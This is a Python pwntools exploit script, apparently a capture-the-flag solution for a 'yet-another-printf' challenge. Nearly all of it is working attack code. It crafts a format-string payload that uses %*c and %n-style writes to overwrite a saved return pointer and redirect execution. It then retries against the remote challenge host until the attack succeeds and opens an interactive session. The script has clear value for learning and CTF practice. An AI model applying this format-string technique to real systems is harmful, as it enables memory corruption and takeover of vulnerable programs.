from pwn import *
'''
offsets | thing | points to
519     | reg0  | reg1
520     | reg1  | reg2
521     | reg2  | last 16 bytes of code
'''

def exploit():
    # works only if int(lower 4 bytes of value of reg2) is positive

    # reach reg2, read lower 4 byte value via dynamic width
    payload = '%c'*520
    payload += '%*c'

    # we now know the value int(last 4 bytes of value of reg2) + 520
    # this means we know a stack addr. The distance to the stack addr
    # that holds the return addr is static. We have to go down 4104
    # bytes from the value in reg2 to reach the saved return ptr.
    # since only the last two bytes matter for that, lets add a magic value
    # so that (520+lower_4_bytes_reg2_val+MAGIC) & 0xFFFF == stack_addr_of_ret & 0xFF
    # => works bc addresses only differ in last two bytes

    # add magic number to forge to correct value & 0xffff
    payload += '%60912c'

    # now we have the correct number in printf counter. Overwrite
    # value of reg2. Abuse %n behavior, we deref two times, taking
    # pointer to pointer. Overwrite 2 bytes.
    payload += '%519$hn'
    
    # Now we need to write the static offset of success() which is 0x71
    # to the last byte of the ret ptr. Lets clear the last byte of the
    # printf counter so that printf counter & 0xFF is 0. Since the 
    # bytes printed so far equals the last 4 bytes of the current
    # reg2 value, read its lowest byte 255 times. Abuse behavior of
    # patched %p, dereferencing and printing as many X as int val of
    # last byte 
    payload += '%520$p' * 255

    # since printf counter & 0xFF = 0, get 0x71 into there,
    # which is the offset of success()
    payload += f'%{0x71}c'

    # write via %n to reg1, causing:
    # reg1->reg2->retptr. Overwrite one byte
    payload += '%520$hhn'

    assert len(payload) <= 4096
    return payload

def main(id):
    con = remote(f'{id}-yet-another-printf.challenge.master.cscg.live',ssl=True,port=31337)
    con.recvuntil(b':')
    con.send((exploit()+'\n').encode())
    c = 0
    while True:
        l = con.recvline()
        if b'SUCCESS' in l:
            c += 1
        else:
            print(f'{c} / 5 worked')
            break

        if c == 5:
            con.interactive()
        

while True:
    main('6a03680ec8b48722a3a12049')
